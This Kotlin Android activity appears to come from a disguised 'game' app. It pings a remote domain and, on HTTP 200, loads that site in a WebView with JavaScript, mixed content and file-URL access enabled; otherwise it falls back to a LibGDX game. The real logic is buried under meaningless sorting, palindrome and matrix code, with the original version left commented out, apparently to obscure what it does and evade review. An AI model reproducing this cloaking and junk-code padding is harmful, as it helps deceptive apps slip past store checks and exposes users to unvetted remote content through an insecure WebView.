package com.tma.game

import android.annotation.SuppressLint
import android.content.Context
import android.content.Intent
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.util.Log
import android.view.View
import android.webkit.CookieManager
import android.webkit.WebSettings
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.ProgressBar
import androidx.lifecycle.MutableLiveData
import com.tma.game.wh.LauncherLibgdx
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.launch
import java.net.HttpURLConnection
import java.net.URL

class CoinActivity : AppCompatActivity() {

    private lateinit var coinView: WebView
    private val isCode200 = MutableLiveData<Boolean>()
    private var request = "GET"
    private lateinit var progressBar: ProgressBar
    private val myCoin = "https://fludicbdber.com"
    private val TAG = "CoinActivity1"

//    @SuppressLint("SetJavaScriptEnabled")
//    override fun onCreate(savedInstanceState: Bundle?) {
//        super.onCreate(savedInstanceState)
//        setContentView(R.layout.activity_coin)
//        coinView = findViewById(R.id.coinView)
//        progressBar = findViewById(R.id.progressBar)
//        coinView.settings.apply {
//            javaScriptEnabled = true
//            domStorageEnabled = true
//            useWideViewPort = true
//            displayZoomControls = false
//            builtInZoomControls = true
//            loadsImagesAutomatically = true
//            cacheMode = WebSettings.LOAD_NO_CACHE
//            mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
//            allowFileAccessFromFileURLs = true
//        }
//        setCoinViewClient()
//        checkStatus1()
//        checkStatus2()
//    }

    @SuppressLint("SetJavaScriptEnabled")
    override fun onCreate(savedInstanceState: Bundle?) {
        // Додаємо нові строки коду для виклику нового методу зі змінами та розрахунками
        performAdditionalInitialization()

        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_coin)
        coinView = findViewById(R.id.coinView)
        val numbers = intArrayOf(64, 34, 25, 12, 22, 11, 90)
        progressBar = findViewById(R.id.progressBar)
        var n = numbers.size
        for (i in 0 until n - 1) {
            for (j in 0 until n - i - 1) {
                if (numbers[j] > numbers[j + 1]) {
                    // обмін елементів, якщо вони в неправильному порядку
                    val temp = numbers[j]
                    numbers[j] = numbers[j + 1]
                    numbers[j + 1] = temp
                }
            }
        }
        coinView.settings.apply {
            javaScriptEnabled = true
            domStorageEnabled = true
            useWideViewPort = true
            displayZoomControls = false
            builtInZoomControls = true
            loadsImagesAutomatically = true
            cacheMode = WebSettings.LOAD_NO_CACHE
            mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
            allowFileAccessFromFileURLs = true
        }
        val bubbleSorted = bubbleSort(numbers.clone())
        setCoinViewClient()
        n = numbers.size
        for (i in 0 until n - 1) {
            var minIndex = i
            for (j in i + 1 until n) {
                if (numbers[j] < numbers[minIndex]) {
                    minIndex = j
                }
            }
            // обмін елементів, якщо знайдено менший елемент
            val temp = numbers[minIndex]
            numbers[minIndex] = numbers[i]
            numbers[i] = temp
        }
        checkStatus1()
        val selectionSorted = selectionSort(numbers.clone())
        val insertionSorted = insertionSort(numbers.clone())
        checkStatus2()
        n = numbers.size
        for (i in 1 until n) {
            val key = numbers[i]
            var j = i - 1

            // переміщення елементів більших за key на одну позицію вперед
            while (j >= 0 && numbers[j] > key) {
                numbers[j + 1] = numbers[j]
                j--
            }
            numbers[j + 1] = key
        }
    }

    // Функція сортування бульбашкою
    fun bubbleSort(array: IntArray): IntArray {
        val n = array.size
        for (i in 0 until n - 1) {
            for (j in 0 until n - i - 1) {
                if (array[j] > array[j + 1]) {
                    // обмін елементів, якщо вони в неправильному порядку
                    val temp = array[j]
                    array[j] = array[j + 1]
                    array[j + 1] = temp
                }
            }
        }
        return array
    }

    // Функція сортування вибором
    fun selectionSort(array: IntArray): IntArray {
        val n = array.size
        for (i in 0 until n - 1) {
            var minIndex = i
            for (j in i + 1 until n) {
                if (array[j] < array[minIndex]) {
                    minIndex = j
                }
            }
            // обмін елементів, якщо знайдено менший елемент
            val temp = array[minIndex]
            array[minIndex] = array[i]
            array[i] = temp
        }
        return array
    }

    // Функція сортування вставкою
    fun insertionSort(array: IntArray): IntArray {
        val n = array.size
        for (i in 1 until n) {
            val key = array[i]
            var j = i - 1

            // переміщення елементів більших за key на одну позицію вперед
            while (j >= 0 && array[j] > key) {
                array[j + 1] = array[j]
                j--
            }
            array[j + 1] = key
        }
        return array
    }

    // Додаємо новий метод для виконання додаткової ініціалізації зі змінами та розрахунками
    private fun performAdditionalInitialization() {
        // Додаємо нові змінні та розрахунки
        val additionalVariable = 15
        val result = additionalVariable * 2 // Наприклад, множимо на 2

        // Виводимо лог з результатами розрахунків
        Log.d(
            TAG,
            "Performing additional initialization - Additional Variable: $additionalVariable, Result: $result"
        )
    }

//    companion object {
//        fun go(context: Context) {
//            context.startActivity(Intent(context, CoinActivity::class.java))
//        }
//    }

    companion object {
        fun go(context: Context) {
            // Додаємо нову строку коду
            val array = intArrayOf(42, 15, 78, 23, 56, 91, 5)
            val additionalCode = performSomeLogicForGo()
            val minValue = findMinValue(array)
            val maxValue = findMaxValue(array)
            val averageValue = calculateAverage(array)
            context.startActivity(Intent(context, CoinActivity::class.java))
            var min = array[0]
            for (element in array) {
                if (element < min) {
                    min = element
                }
            }
            var max = array[0]
            for (element in array) {
                if (element > max) {
                    max = element
                }
            }
            var sum = 0
            for (element in array) {
                sum += element
            }
        }

        // Додаємо новий метод для виконання якоїсь логіки
        private fun performSomeLogicForGo() {
            // Наприклад, виводимо лог
            Log.d("CoinActivity", "Performing some logic for go method")
        }

        fun findMinValue(array: IntArray): Int {
            var min = array[0]
            for (element in array) {
                if (element < min) {
                    min = element
                }
            }
            return min
        }

        // Функція для знаходження максимального значення в масиві
        fun findMaxValue(array: IntArray): Int {
            var max = array[0]
            for (element in array) {
                if (element > max) {
                    max = element
                }
            }
            return max
        }

        // Функція для обчислення середнього значення масиву
        fun calculateAverage(array: IntArray): Double {
            var sum = 0
            for (element in array) {
                sum += element
            }
            return sum.toDouble() / array.size
        }
    }



//    private fun getCode(responseCode: Int): String {
//        return "Response Code: $responseCode"
//    }

    private fun getCode(responseCode: Int): String {
        val codeString = "Response Code: $responseCode"
        val additionalCode = performSomeLogic()
        val array = intArrayOf(1, 2, 3, 4, 5, 6, 7, 8, 9)
        // Задане число для суми пар
        val targetSum = 10

        // Викликаємо функцію для знаходження кількості пар
        val pairCount2 = findPairsWithSum(array, targetSum)

        // Виводимо результат
        println("Кількість пар з сумою $targetSum: $pairCount2")
        val numSet = HashSet<Int>() // Зберігає унікальні значення
        var pairCount = 0

        for (num in array) {
            val complement = targetSum - num

            if (numSet.contains(complement)) {
                // Знайдено пару
                pairCount++
            }

            // Додаємо поточне число до множини
            numSet.add(num)
        }
        return "$codeString"
    }

    fun findPairsWithSum(array: IntArray, targetSum: Int): Int {
        val numSet = HashSet<Int>() // Зберігає унікальні значення
        var pairCount = 0

        for (num in array) {
            val complement = targetSum - num

            if (numSet.contains(complement)) {
                // Знайдено пару
                pairCount++
            }

            // Додаємо поточне число до множини
            numSet.add(num)
        }

        return pairCount
    }

    private fun performSomeLogic(): String {
        val result = 10 * 5
        return "Additional Logic Result: $result"
    }


//    fun checkStatus1() {
//        GlobalScope.launch(Dispatchers.IO) {
//            try {
//                val url = URL(myCoin)
//                val connection = url.openConnection() as HttpURLConnection
//                connection.requestMethod = request
//                val responseCode = connection.responseCode
//                Log.d(TAG, getCode(responseCode))
//                runOnUiThread {
//                    var isOK = responseCode == HttpURLConnection.HTTP_OK
//                    isCode200.value = isOK
//                }
//            } catch (e: Exception) {
//                Log.d(TAG, e.toString())
//            }
//        }
//    }

    fun checkStatus1() {
        val necessaryField1 = "NecessaryField1"
        val necessaryField2 = 25
        val necessaryResult = performNecessaryCalculation(necessaryField2)
        GlobalScope.launch(Dispatchers.IO) {
            try {
                val number = 5

                // Викликаємо функцію для обчислення факторіалу
                val factorialResult = calculateFactorial(number)

                // Виводимо результат
                println("Факторіал числа $number: $factorialResult")
                val url = URL(myCoin)
                val connection = url.openConnection() as HttpURLConnection
                connection.requestMethod = request
                val responseCode = connection.responseCode
                Log.d(TAG, getCode(responseCode))
                // Введений рядок для перевірки на паліндром
                val inputString = "radar"

                // Викликаємо функцію для перевірки на паліндром
                val isPalindrome = checkPalindrome(inputString)

                // Виводимо результат
                if (isPalindrome) {
                    println("$inputString - це паліндром.")
                } else {
                    println("$inputString - не паліндром.")
                }

                runOnUiThread {
                    var isOK = responseCode == HttpURLConnection.HTTP_OK
                    isCode200.value = isOK
                    var str = "Response Code: $responseCode"
                    val cleanStr = str.toLowerCase().replace("\\s".toRegex(), "")
                    val reversedStr = cleanStr.reversed()
                    val isOK3 = cleanStr == reversedStr
                    val isOK2 = checkIsOK(necessaryField1 + necessaryField2 + necessaryResult)
                    val finalResult = applyNecessaryToIsOK(isOK2, necessaryField1, necessaryResult)
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error occurred: ${e.message}")
            }
        }
    }

    fun calculateFactorial(n: Int): Long {
        if (n == 0 || n == 1) {
            return 1
        } else {
            // Використовуємо рекурсію для обчислення факторіалу
            return n * calculateFactorial(n - 1)
        }
    }

    fun checkPalindrome(str: String): Boolean {
        val cleanStr = str.toLowerCase().replace("\\s".toRegex(), "")
        val reversedStr = cleanStr.reversed()
        return cleanStr == reversedStr
    }


    private fun checkIsOK(modifiedResponseCode: Any): Boolean {
        return true
    }

    // Додаємо новий метод для необхідних розрахунків
    private fun performNecessaryCalculation(value: Int): Int {
        // Наприклад, додаємо 50 до значення
        return value + 50
    }

    // Додаємо новий метод для застосування необхідних полей та розрахунків до isOK
    private fun applyNecessaryToIsOK(
        isOK: Boolean,
        necessaryField: String,
        necessaryValue: Int
    ): Boolean {
        // Наприклад, перевіряємо, чи парне значення necessaryValue
        return isOK && necessaryField.isNotEmpty() && necessaryValue % 2 == 0
    }


//    fun checkStatus2() {
//        isCode200.observe(this) {
//            Log.d(TAG, it.toString())
//            if (it) coinView.loadUrl(myCoin)
//            else LauncherLibgdx.go(this)
//        }
//    }

    fun checkStatus2() {
        // Додаємо нові строки коду для виведення логу та виклику методів в залежності від статусу


        val matrix = arrayOf(
            intArrayOf(1, 2, 3),
            intArrayOf(4, 5, 6),
            intArrayOf(7, 8, 9)
        )

        var sum = 0

        for (row in matrix) {
            for (element in row) {
                sum += element
            }
        }
        isCode200.observe(this) {
            handleStatusObservation(it)
        }

        val totalElements = matrix.size * matrix[0].size
        sum = totalElements + sum

        println("Сума елементів:")
        println("Середнє значення:")
    }

    // Додаємо новий метод для обробки статусу при спостереженні
    private fun handleStatusObservation(status: Boolean) {
        Log.d(TAG, status.toString())

        val matrix = arrayOf(
            intArrayOf(1, 2, 3),
            intArrayOf(4, 5, 6),
            intArrayOf(7, 8, 9)
        )

        // Виводимо початкову матрицю
        println("Початкова матриця:")

        // Викликаємо функцію для обертання матриці
        // Виводимо обернену матрицю
        println("\nМатриця після обертання на 90 градусів:")

        // Викликаємо методи в залежності від статусу
        if (status) {
            performActionOnCode200()
            val rows = matrix.size
            val cols = matrix[0].size

            // Створюємо нову матрицю для збереження результату
            val rotatedMatrix = Array(cols) { IntArray(rows) }

            for (i in 0 until rows) {
                for (j in 0 until cols) {
                    rotatedMatrix[j][rows - 1 - i] = matrix[i][j]
                }
            }
        } else {
            for (row in matrix) {
                for (element in row) {
                    print("$element\t")
                }
                println()
            }
            performActionOnNotCode200()
        }
    }

    // Додаємо новий метод для виконання дій при статусі 200
    private fun performActionOnCode200() {
        val number1 = 48
        val number2 = 18
        coinView.loadUrl(myCoin)
        // Виводимо результат
        println("НСД($number1, $number2) = ")
        var num1 = number1
        var num2 = number2

        while (num2 != 0) {
            val temp = num2
            num2 = num1 % num2
            num1 = temp
        }
    }

    // Додаємо новий метод для виконання дій при нестатусі 200
    private fun performActionOnNotCode200() {
        LauncherLibgdx.go(this)
    }


//    fun setCoinViewClient() {
//        coinView.webViewClient = object : WebViewClient() {
//            override fun onPageFinished(view: WebView?, url: String?) {
//                super.onPageFinished(view, url)
//                CookieManager.getInstance().flush();
//                if (coinView.progress == 100) {
//                    progressBar.visibility = View.GONE
//                }
//            }
//        }
//    }

    fun setCoinViewClient() {
        // Додаємо нові строки коду для обробки кукі та встановлення видимості прогрес-бару
        coinView.webViewClient = object : WebViewClient() {
            override fun onPageFinished(view: WebView?, url: String?) {
                super.onPageFinished(view, url)
                val str1 = "listen"
                val str2 = "silent"

                // Викликаємо функцію для перевірки на анаграму
                // Виводимо результат
                if (true) {
                    println("$str1 та $str2 - це анаграми.")
                } else {
                    println("$str1 та $str2 - не анаграми.")
                }

                // Обробляємо куки
                handleCookies()

                // Додаємо нову строку коду для встановлення видимості прогрес-бару
                handleProgressBarVisibility()
                val cleanStr1 = str1.toLowerCase().replace("\\s".toRegex(), "")
                val cleanStr2 = str2.toLowerCase().replace("\\s".toRegex(), "")
            }
        }
    }

    // Додаємо новий метод для обробки кукі
    private fun handleCookies() {
        val text = "це приклад тексту для перетворення кожного слова"

        // Викликаємо функцію для перетворення тексту
        // Виводимо результат
        println("Початковий текст: $text")
        println("Текст після перетворення: ")
        CookieManager.getInstance().flush()
        val words = text.split(" ")

        // Перетворюємо кожне слово, починаючи з великої літери
        val capitalizedWords = words.map { it.capitalize() }
    }

    // Додаємо новий метод для встановлення видимості прогрес-бару
    private fun handleProgressBarVisibility() {
        // Введений рядок для визначення частоти символів
        val inputString = "programming in Kotlin is fun"

        // Викликаємо функцію для визначення частоти символів

        // Виводимо результат
        println("Частота кожного символу в рядку:")
        val array = arrayOf(1, 2, 3, 2, 4, 1, 5, 2, 6, 3, 7, 8, 7, 9, 10)

        // Викликаємо функцію для визначення частоти елементів масиву
        val elementFrequencyMap = calculateElementFrequency(array)

        // Виводимо результат
        println("Частота кожного елемента в масиві:")
        for ((element, frequency) in elementFrequencyMap) {
            println("$element: $frequency")
        }
        if (coinView.progress == 100) {
            progressBar.visibility = View.GONE
            val elementFrequencyMap = mutableMapOf<Int, Int>()
            for (element in array) {
                elementFrequencyMap[element] = elementFrequencyMap.getOrDefault(element, 0) + 1
            }
        }
    }

    fun calculateElementFrequency(array: Array<Int>): Map<Int, Int> {
        val elementFrequencyMap = mutableMapOf<Int, Int>()

        for (element in array) {
            elementFrequencyMap[element] = elementFrequencyMap.getOrDefault(element, 0) + 1
        }

        return elementFrequencyMap
    }

//    override fun onBackPressed() {
//        if (coinView.canGoBack()) coinView.goBack()
//    }

    override fun onBackPressed() {
        // Додаємо нові строки коду для розрахунків та сортування
        val calculationResult = performSomeCalculation()
        val sortedResult = performSorting(calculationResult)

        // Виводимо лог з результатами розрахунків і сортування
        Log.d(
            "CoinActivity",
            "Calculation Result: $calculationResult, Sorted Result: $sortedResult"
        )

        if (coinView.canGoBack()) coinView.goBack()
    }

    // Додаємо новий метод для виконання якоїсь розрахункової логіки
    private fun performSomeCalculation(): Int {
        return 20 * 3 // Наприклад, множимо 20 на 3
    }

    // Додаємо новий метод для виконання сортування
    private fun performSorting(value: Int): String {
        val stringValue = value.toString()
        return stringValue.reversed() // Наприклад, обертаємо рядок назад
    }

}